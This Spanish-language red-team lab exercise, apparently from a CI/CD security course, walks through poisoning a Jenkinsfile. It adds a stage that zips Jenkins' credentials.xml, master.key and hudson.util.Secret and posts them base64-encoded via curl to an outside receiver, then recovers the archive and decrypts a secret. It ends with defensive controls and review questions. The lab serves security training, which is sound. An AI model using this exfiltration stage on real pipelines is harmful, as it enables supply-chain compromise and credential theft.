# 08 - Exfiltracion de credenciales desde el Jenkinsfile

**Clase 3 · 30 min · M4 Jenkins Demo 02**
**Fase:** ejecucion en CI + robo de credenciales
**MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain), T1552.001 (Credentials In Files)
**Riesgo OWASP CI/CD:** CICD-SEC-4 (pipeline envenenado), CICD-SEC-6 (higiene de credenciales)

## Escenario

No necesitas la consola de scripts. Tienes cuenta de desarrollador y permiso de
push (`dev`). El pipeline `build-and-push` lee el `Jenkinsfile` del repo en cada
build. Si anades un stage, el runner ejecutara tu codigo **con el
`JENKINS_HOME` montado**.

Objetivo: empaquetar `credentials.xml`, `master.key` y `hudson.util.Secret`, y
enviarlos fuera. Con esos tres archivos, las credenciales se pueden descifrar
aunque cierres el acceso a Jenkins.

> El job construye `*/main`. Si trabajas en una rama, el build no la vera. Para
> el lab, commitea en `main` (simula una cuenta de dev comprometida). En un caso
> real, el atacante cambiaria tambien la rama del job o usaria un PR aprobado.

## Objetivo de aprendizaje

- Ver que el `Jenkinsfile` es codigo controlado por el repo.
- Construir un stage que lee el `JENKINS_HOME` y exfiltra.
- Recuperar y abrir el paquete desde el receptor.
- Entender por que `master.key` + `hudson.util.Secret` son el verdadero botin.

## Antes de empezar

```bash
cd /tmp && rm -rf lab08
git clone http://dev:dev12345@localhost:3000/devops-org/devops-demo.git lab08
cd lab08
curl -s http://localhost:8888/__clear
```

## Paso 1 - Mirar el Jenkinsfile legitimo

```bash
sed -n '1,60p' Jenkinsfile
```

Fijate en la estructura:

```groovy
pipeline {
  agent any
  stages {
    stage('Test') { ... }
    ...
  }
  post { ... }
}
```

Tu stage debe ir **dentro de `stages`**, justo antes de la llave que lo cierra.
Si lo pones antes de `post` sin meterlo en `stages`, Jenkins falla con
`Undefined section "stage"`. Es el error mas comun de este lab.

## Paso 2 - Insertar el stage

Edita `Jenkinsfile` y deja el final asi (el stage nuevo es el ultimo de
`stages`):

```groovy
    stage('Attacker Actions') {
      steps {
        sh '''
          cd /var/jenkins_home
          zip -q /tmp/cred.zip credentials.xml secrets/hudson.util.Secret secrets/master.key
          base64 -w0 /tmp/cred.zip | curl -s -X POST http://hookcat:8888/jenkins/exfil --data-binary @-
        '''
      }
    }
  }

  post {
    always {
```

**Por que base64:** hookcat guarda texto; un zip binario directo se corrompe.
`base64 -w0` lo convierte en una linea sin saltos.

## Paso 3 - Push y build

```bash
git -c user.name=dev -c user.email=dev@lab.local commit -am "ci: add metrics"
git push
```

```bash
cd /home/ponciop/devops-redteam
source <(sed -n 's/^\(JENKINS_[A-Z]*\)=\(.*\)/export \1="\2"/p' seed/repo/secrets/jenkins_token.txt)
C=$(curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" -c /tmp/cj08 \
  http://localhost:8080/crumbIssuer/api/json \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["crumb"])')
curl -s -o /dev/null -w 'build %{http_code}\n' \
  -u "$JENKINS_USER:$JENKINS_TOKEN" -b /tmp/cj08 -H "Jenkins-Crumb: $C" \
  -X POST http://localhost:8080/job/build-and-push/build
```

**Que esperar:** `201` y, tras ~30 s, `Finished: SUCCESS` en la consola.

```bash
sleep 30
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" \
  http://localhost:8080/job/build-and-push/lastBuild/consoleText | tail -5
```

## Paso 4 - Recuperar el paquete

```bash
curl -s http://localhost:8888/__requests > /tmp/reqs.json
python3 - <<'PY'
import json, base64
reqs = json.load(open('/tmp/reqs.json'))
body = next(r['body'] for r in reqs if '/jenkins/exfil' in r['path'])
open('/tmp/cred.zip', 'wb').write(base64.b64decode(body))
print('zip escrito')
PY
rm -rf /tmp/stolen && mkdir /tmp/stolen
cd /tmp/stolen && unzip -o /tmp/cred.zip
ls -l secrets
```

**Que esperar:** `credentials.xml`, `secrets/master.key` y
`secrets/hudson.util.Secret`.

## Paso 5 - Descifrar el secreto

Copia el `<secret>` de `credentials.xml` y usa la consola del lab 07:

```groovy
println hudson.util.Secret.decrypt('{SECRET_DE_credentials.xml}')
```

**Que esperar:** `FLAG{jenkins_cred_decrypt}`

Ruta offline: con los tres archivos se puede descifrar fuera de Jenkins. En el
lab usamos la consola porque el target la tiene abierta; en un engagement con
Jenkins endurecido, el paquete es lo que te llevas para descifrar en tu maquina.

## Paso 6 - Limpiar el repo

```bash
cd /tmp/lab08 && git revert --no-edit HEAD && git push
```

## Evidencia para el informe

- Diff del `Jenkinsfile` y numero de build.
- Tamano y hash del zip exfiltrado (`sha256sum /tmp/cred.zip`).
- Lista de archivos dentro del zip.
- Valor descifrado (redactado en el informe final) y por que `master.key`
  convierte el robo en persistente.

## Checkpoint

1. Por que el stage tiene acceso a `/var/jenkins_home`?
2. Que diferencia hay entre robar `credentials.xml` y robar tambien
   `master.key`?
3. Que control rompe la cadena: proteger `main`, revisar PRs, o aislar el
   agente? Y por que los tres?

## Defensa

- Proteger ramas y requerir revision para cambios en `Jenkinsfile`.
- Pipelines desde `main` con aprobacion, no desde ramas libres.
- Agente efimero y sin `JENKINS_HOME` accesible desde el job.
- Rotacion de `master.key` (implica re-cifrar credenciales) si hay fuga.
- Alertar de stages nuevos que leen rutas sensibles o hacen POST externos.
